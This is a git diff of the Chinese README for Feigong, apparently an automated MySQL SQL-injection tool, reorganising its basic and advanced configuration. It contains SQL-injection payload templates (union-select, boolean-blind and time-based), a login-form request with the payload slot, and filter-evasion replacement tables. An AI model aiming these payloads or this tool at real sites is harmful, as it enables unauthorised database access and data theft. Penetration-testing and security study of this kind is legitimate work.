@@ -67,30 +67,52 @@ Feigong
 │  README.md
 │
 ├─demo
-│      demo1.py
-│      demo2.py
+│  ├─demo1
+│  │      advanced_config.py
+│  │      config.py
+│  │
+│  └─demo2
+│          advanced_config.py
+│          config.py
 │
 ├─lib
+│      Conpayload.py
+│      data.py
 │      dealpayload.py
 │      log.py
-│      ltqdm.py
+│      unpack.py
 │      __init__.py
 │
 ├─log
+│
 └─sqlier
-        columns.py
-        config.py
-        config_default.py
-        content.py
-        data.py
-        database.py
-        expand.py
-        tables.py
-        test.py
-        __init__.py
+    │  advanced_config.py
+    │  config.py
+    │  __init__.py
+    │
+    ├─configuration
+    │      buildconfig.py
+    │      __init__.py
+    │
+    ├─default
+    │      advanced_config_default.py
+    │      config_default.py
+    │      __init__.py
+    │
+    ├─tamper
+    │      expand.py
+    │      __init__.py
+    │
+    └─techniques
+            columns.py
+            content.py
+            database.py
+            tables.py
+            test.py
+            __init__.py
 ```
 
-Feigong一切一切的核心在于sqlier/config.py
+Feigong一切一切的核心在于sqlier/config.py和sqlier/advanced_config.py,代码层的自定义可以面对任何情况
 
 ### 安装 ###
 
@@ -106,13 +128,6 @@ git clone https://github.com/LoRexxar/Feigong.git
 pip install -r requirements.txt
 ```
 
-lxml的安装比较特殊
-[https://pypi.python.org/pypi/lxml/3.4.2](https://pypi.python.org/pypi/lxml/3.4.2)
-
-```
-pip install lxml-3.4.2-cp27-none-win_amd64.whl
-```
-
 打开对应Feigong的目录，跑一下默认demo看看结果
 ```
 python feigong.py
@@ -120,72 +135,22 @@ python feigong.py
 
 ### 开始 ###
 
-Feigong是通过修改sqlier/config.py来实现注入的，config.py是feigong的基类，让我们来看看config_default.py中的配置
+Feigong是通过修改sqlier/config.py & sqlier/advanced_config.py来实现注入的，config.py是feigong的基础配置，advanced_config.py是进阶配置，而default中是默认的配置文件，以免默认修改过后找不到正确的配置。
 
+config.py是基础配置，只有基础配置完成的情况下才能进行正常的配置。
 ```
-#!/usr/bin/env python
-# -*- coding:utf-8 -*-
-import requests
-from bs4 import BeautifulSoup
-from lib.log import logger
-from lib.dealpayload import DealPayload
-import logging
-
-__author__ = "LoRexxar"
-
-
-"""
-若注入方式为normal，你需要自定义解包函数, 提供两种方式，一种为find, 一种为bs4
-需要注意的是，这里输入为r.text.encode('utf-8'), return必须为查询返回值，不能带标签符号等
-def UnpackFunction(self, r):
-    index = r.find('<td>')
-    index2 = r[index + 4:].find('</td>')
-    return r[index + 4:][:index2]
-
-bs4
-def UnpackFunction(r):
-    soup = BeautifulSoup(r, "lxml")
-    r = soup.find_all("td")[1].string
-    return r
-"""
-
-
-def UnpackFunction(r):
-    # index = r.find('<td>')
-    # index2 = r[index + 4:].find('</td>')
-    soup = BeautifulSoup(r, "lxml")
-    r = soup.prettify()
-    try:
-        r = soup.find_all("td")[1].string
-    except IndexError:
-        logger.error("UnpackFunction error...")
-        exit(0)
-    return r
-
-
 class BaseConfig:
     def __init__(self):
         """
         基类初始化，整个注入工具的核心配置
         """
-        self.version = "V0.9.9"
-
         # 目标url
         self.url = 'http://demo.lorexxar.pw/get.php'
-        self.s = requests.Session()
 
         # 请求头参数
         # cookies = {"username":data,"path":"/admin/","domain":"451bf8ea3268360ee.jie.sangebaimao.com"}
         # self.headers = {"Cookie": "username=" + data + "; captcha=od8lgg6f7i71q16j9rd7p7j9a2; username=" + data}
         self.headers = {}
-
-        # log日志级别，debug为显示大部分信息，info为注入结果的显示
-        LogLevel=(
-            logging.DEBUG,
-            logging.INFO,
-            logging.WARN
-        )
-        self.loglevel = LogLevel[1]
 
         # 传参方式 0为GET 1为POST
         SqliRequest = (
@@ -200,21 +165,31 @@ class BaseConfig:
             "build",
             "time"
         )
-        self.sqlimethod = SqliMethod[0]
+        self.sqlimethod = SqliMethod[1]
+        """
+        从这里开始，要进入对于payload的配置了，首先需要对注入语句进行配置，然后注入语句通过自定义的替换表，之后构造注入语句为请求
+        payload===>替换为指定payload===>自定义替换表===>请求===>开始注入
 
-        # 若注入方式为normal，你需要自定义解包函数, 提供两种方式，一种为find, 一种为bs4,解包函数在上面
+        若为normal注入，必须构造返回BSqlier的payload，并通过test模式修改解包函数直至可以获取返回值（必须以空格为分隔符，结尾必须只有一个词（结尾可以通过修改自定义替换表中的值来修改））
+        eg: self.payload = "padding' union all select 1,'Feigong' #"
+
+        若为build注入，则为与、或条件构造，如果是与注入，padding必须为返回值的条件
+        eg: self.payload = "padding' && 2333 #"
+
+        若为time注入，则可以使用上面两种的任何一种，格式与其相符，同样，关键位置使用2333或者'Feigong'填充
+        eg: self.payload = "padding' union all select 1,'Feigong' #"
+        eg: self.payload = "padding' && 2333 #"
 
         """
-        若注入方式为build盲注，则通过返回长度判断
-        永真条件的长度（盲注时需要使用），默认为0，可设置, 如果不设置会默认使用self.payload获取的返回长度为self.len
-        """
-        self.len = 0
+        self.payload = "padding' && 2333 #"
 
         """
-        若注入方式为time，你需要设置延时，建议根据自己的网络环境选择，如果网络环境较差，建议还是大一点儿
-        建议2-5，现在版本还是单线程，所以时间盲注会非常慢非常慢...
+        配置请求,把请求中payload的位置设置为Feigong（如果拼错了就会全部无效...）
+        self.requesetformat = "user=Feigong&passwd=ddog123&submit=Log+In"
+        self.requesetformat = {"user": "Feigong", "password": "a"}
         """
-        self.time = 2
+        self.requesetformat = "user=Feigong&passwd=ddog123&submit=Log+In"
+        # self.requesetformat = {"user": "Feigong", "password": "a"}
 
         """
         在注入之前，你首先需要测试，test.py中包含所有的测试函数，包括test、get_now_database、get_version、get_user
@@ -223,7 +198,7 @@ class BaseConfig:
 
         而testmethod则是选择使用那种测试，互相兼容可以同时跑
         """
-        self.wtest = True
+        self.wtest = False
 
         self.testmethod = {
             "test": 0,
@@ -249,6 +224,42 @@ class BaseConfig:
             "tables": 1,
             "database": 1
         }
+
+```
+
+advanced_config.py是进阶配置，进阶配置可以配置一些特殊的请况
+```
+class AdvanceConfig(BaseConfig):
+    def __init__(self):
+        """
+        进阶配置，如果对代码不够熟悉，建议不修改这部分配置
+        """
+        BaseConfig.__init__(self)
+        # 版本号
+        self.version = "V1.2.0"
+
+        # 初始化request
+        self.s = requests.Session()
+
+        # log日志级别，debug为显示大部分信息，info为注入结果的显示
+        LogLevel = (
+            logging.DEBUG,
+            logging.INFO,
+            logging.WARN
+        )
+        self.loglevel = LogLevel[0]
+
+        """
+        若注入方式为build盲注，则通过返回长度判断
+        永真条件的长度（盲注时需要使用），默认为0，可设置, 如果不设置会默认使用self.payload获取的返回长度为self.len
+        """
+        self.len = 0
+
+        """
+        若注入方式为time，你需要设置延时，建议根据自己的网络环境选择，如果网络环境较差，建议还是大一点儿
+        建议2-5，现在版本还是单线程，所以时间盲注会比较慢...
+        """
+        self.time = 3
 
         """
         database可以自定义，默认为空，若为空会调用get_database(),这里是一个列表，必须按照列表格式
@@ -276,30 +287,6 @@ class BaseConfig:
         当选择注入content时，你需要指定输入数据的上限，默认为10
         """
         self.content_count = 10
-
-        """
-        从这里开始，要进入对于payload的配置了，首先需要对注入语句进行配置，然后注入语句通过自定义的替换表，之后构造注入语句为请求
-        payload===>替换为指定payload===>自定义替换表===>请求===>开始注入
-
-        若为normal注入，必须构造返回BSqlier的payload，并通过test模式修改解包函数直至可以获取返回值（必须以空格为分隔符，结尾必须只有一个词（结尾可以通过修改自定义替换表中的值来修改））
-        eg: self.payload = "padding' union all select 1,'Feigong' #"
-
-        若为build注入，则为与、或条件构造，如果是与注入，padding必须为返回值的条件
-        eg: self.payload = "padding' && 2333 #"
-
-        若为time注入，则可以使用上面两种的任何一种，格式与其相符，同样，关键位置使用2333或者'Feigong'填充
-        eg: self.payload = "padding' union all select 1,'Feigong' #"
-        eg: self.payload = "padding' && 2333 #"
-
-        """
-        self.payload = "padding' && 2333 #"
-
-        """
-        配置请求,把请求中payload的位置设置为BSqlier（如果拼错了就会全部无效...）
-        self.requesetformat = "user=BSqlier&passwd=ddog123&submit=Log+In"
-        self.requesetformat = {"user": "BSqlier", "password": "a"}
-        """
-        self.requesetformat = "user=BSqlier&passwd=ddog123&submit=Log+In"
 
         """
         配置自定义替换表,合理的替换表配置远远可以替换出想要的所有情况payload
@@ -346,16 +333,16 @@ class BaseConfig:
             'columns': 'columns',
             'column_name': 'column_name',
             # 然后是特殊的字符
-            ' ': ' ',   # 由于过滤后自动进行url encode，所以替换表不能使用url encode过的字符，eg:%0a->\n %0b->\x0b
-            '#': '#'    # --+
+            ' ': ' ',  # 由于过滤后自动进行url encode，所以替换表不能使用url encode过的字符，eg:%0a->\n %0b->\x0b
+            '#': '#'  # --+
         }
 
         """
         初始化dealpayload类，传入self.sqlimethod，self.payload, self.requestformat, self.filter
         """
-        self.dealpayload = DealPayload(self.sqlirequest, self.payload, self.requesetformat, self.filter, self.time)
-
+        self.dealpayload = ConPayload(self.sqlirequest, self.payload, self.requesetformat, self.filter, self.time)
 ```
+
 
 Feigong现在的版本还仅仅支持对于mysql的3种注入方式：
 - 普通注入（normal）：也就是会有返回的注入点
@@ -365,7 +352,7 @@ Feigong现在的版本还仅仅支持对于mysql的3种注入方式：
 
 #### 基础配置 ####
 
-首先你需要进行基础的配置，首先是基础的目标url，请求头，log日志级别，传参方式，注入方式等...
+首先你需要进行基础的配置，首先是基础的目标url，请求头，传参方式，注入方式等...
 
 ```
 # 目标url
@@ -376,14 +363,6 @@ self.s = requests.Session()
 # cookies = {"username":data,"path":"/admin/","domain":"451bf8ea3268360ee.jie.sangebaimao.com"}
 # self.headers = {"Cookie": "username=" + data + "; captcha=od8lgg6f7i71q16j9rd7p7j9a2; username=" + data}
 self.headers = {}
-
-# log日志级别，debug为显示大部分信息，info为注入结果的显示
-LogLevel=(
-    logging.DEBUG,
-    logging.INFO,
-    logging.WARN
-)
-self.loglevel = LogLevel[1]
 
 # 传参方式 0为GET 1为POST
 SqliRequest = (
@@ -419,24 +398,8 @@ self.sqlimethod = SqliMethod[0]
 
 ##### normal #####
 
-如果注入模式为normal，则需要解包函数和基础payload
+如果注入模式为normal，需要定义基础payload
 
-解包函数UnpackFunction,默认输入r为request模块的utf-8编码返回`r.text.encode('utf-8')`
-
-feigong默认提供了bs4，所以你可以通过多种方式解包，甚至可以自定义，要返回数据必须为注入数据
-```
-def UnpackFunction(r):
-    soup = BeautifulSoup(r, "lxml")
-    r = soup.prettify()
-    try:
-        r = soup.find_all("td")[1].string
-    except IndexError:
-        logger.error("UnpackFunction error...")
-        exit(0)
-    return r
-```
-
-然后是基础payload
 ```
 self.payload = "padding' union all select 1,'Feigong' #"
 ```
@@ -458,7 +421,7 @@ eg: self.payload = "padding' && 2333 #"
 
 ##### time #####
 
-如果注入模式为time，除了要设置基础payload以外，还需要设置睡眠时间，默认为2
+如果注入模式为time，除了要设置基础payload以外，还需要设置睡眠时间，这部分在进阶配置中，默认为2
 ```
  self.time = 2
 ```
@@ -521,7 +484,8 @@ self.sqlilocation = {
 }
 ```
 
-在注入模式选择中，我们是可以通过预设值来减少注入的范围
+#### 进阶配置 ####
+在进阶配置中，我们是可以通过预设值来减少注入的范围
 
 
 database可以自定义，默认为空，若为空会调用get_database(),这里是一个列表，必须按照列表格式（当然，如果database_name错误...则不会注到数据）
@@ -549,6 +513,8 @@ self.content_count = 10
 ```
 
 #### 配置自定义替换表 ####
+
+这部分一是在进阶配置中
 
 配置自定义替换表,合理的替换表配置远远可以替换出想要的所有情况payload
 
